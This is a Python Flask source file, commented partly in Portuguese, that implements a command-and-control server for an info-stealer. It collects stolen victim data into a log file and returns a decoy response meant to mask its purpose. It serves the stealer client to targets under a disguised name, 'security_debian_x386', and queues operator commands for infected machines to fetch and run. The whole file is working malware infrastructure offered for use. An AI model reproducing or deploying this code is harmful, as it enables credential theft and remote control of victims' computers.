from flask import Flask, request, jsonify
from flask import send_from_directory
import os, threading, logging, time

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

HOST = "localhost"
PORT = 4443

def clear_terminal():
    os.system('clear')

@app.route('/login', methods=['POST'])                     # Endpoint to receive data from the stealer client 
def login_data():
    data = request.get_data(as_text=True)

    print(f"\n[+] Dados recebidos do cliente:\n{data}\nC2_Command > ", end="")

    with open('info-gathering.txt', 'a') as f:
        f.write(f"{data}\n")
    return jsonify({"message": "logging successful"}), 200 # Message to mask the real purpose

@app.route('/register', methods=['POST'])                  # Endpoint to receive data commands from the stealer client
def register_command():
    data = request.get_data(as_text=True)

    print(f"\n[+] Comando recebido:\n{data}\nC2_Command > ", end="")

    with open('command-log.txt', 'a') as f:
        f.write(f"{data}\n")
    return jsonify({"message": "command registered"}), 200

@app.route('/security_debian_x386', methods=['GET'])       # Endpoint to serve the stealer client
def get_stealer_client():
    return send_from_directory('app', 'stealer_client.py')

latest_command = {"cmd": ""}

@app.route('/loopback', methods=['POST'])                   # Endpoint for the client to fetch the latest command
def loopback():
    if request.method == 'POST':
        command_to_send = latest_command["cmd"]
        latest_command["cmd"] = ""                          # Clear the command after sending it
        return jsonify({"command": command_to_send})

# Função para a interface de comando do operador
def operator_command_interface():
    global latest_command

    print("\n[+] Interface de Comando do Operador: Digite 'exit' para fechar o C2.")
    while True:
        try:
            cmd = input("C2_Command > ")
            if cmd.lower() == "exit":
                print("[!] Desligando o servidor C2. Pressione Ctrl+C na janela do Flask para sair completamente.")
                os._exit(0) # Força a saída de todas as threads
            latest_command["cmd"] = cmd
            print(f"[+] Comando definido: '{cmd}'")
        except EOFError: # Lida com Ctrl+D
            print("\n[!] EOF recebido. Digite 'exit' para sair.")
        except KeyboardInterrupt: # Lida com Ctrl+C
            print("\n[!] Ctrl+C detectado. Digite 'exit' para sair ou pressione Ctrl+C novamente para forçar.")
            continue # Permite que o loop continue para o 'exit' ou outro Ctrl+C

def run_flask_app():
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)

def server():
    flask_thread = threading.Thread(target=run_flask_app)
    flask_thread.daemon = True
    flask_thread.start()

    time.sleep(0.3)

    clear_terminal()

    print("[+] Servidor de Comando e Controle está rodando...")
    print(f"[+] Cliente buscará comandos em http://{HOST}:{PORT}/loopback (POST)")
    print(f"[+] Alvos podem baixar o cliente em http://{HOST}:{PORT}/security_debian_x386")

    operator_command_interface()

if __name__ == "__main__":
    server()